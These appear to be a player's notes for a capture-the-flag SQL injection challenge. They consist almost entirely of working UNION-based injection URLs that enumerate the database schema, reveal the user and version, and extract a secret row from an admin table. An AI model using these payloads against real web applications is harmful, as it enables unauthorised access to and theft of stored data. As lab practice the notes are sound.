Hint: DUmp the db to see the tables and columns.

Useful resource: [https://resources.infosecinstitute.com/topic/dumping-a-database-using-sql-injection/]

Working queries:

- https://web4.chall.necst.it/home.php?appliance=" UNION ALL SELECT * FROM appliances, images ; -- "
- https://web4.chall.necst.it/home.php?appliance=" UNION SELECT NULL, NULL, NULL, NULL ; -- -

Table "images" has 3 fields:
- [x] https://web4.chall.necst.it/home.php?appliance=" UNION SELECT images.*, NULL from images ; -- - 
- [ ] https://web4.chall.necst.it/home.php?appliance=" ORDER BY 1 ; -- - 

Finds current user, version, and db name:
- https://web4.chall.necst.it/home.php?appliance=" UNION SELECT user(), NULL, NULL, NULL ; -- - 
- https://web4.chall.necst.it/home.php?appliance=" UNION SELECT user(), @@version, database(), NULL ; -- - 

Find tables and columns in the db:
- https://web4.chall.necst.it/home.php?appliance=" UNION SELECT group_concat(table_name), NULL, NULL, NULL from information_schema.tables where table_schema=database(); -- - 
- https://web4.chall.necst.it/home.php?appliance=" UNION SELECT group_concat(column_name), NULL, NULL, NULL from information_schema.columns where table_schema=database(); -- - 

Find the secret of the user "Bradley@bargainkingdom.com" from table "super_secret_admin_table" (id,email,code_1):
- https://web4.chall.necst.it/home.php?appliance=" UNION SELECT *, NULL from super_secret_admin_table where email="Bradley@bargainkingdom.com"; -- - 
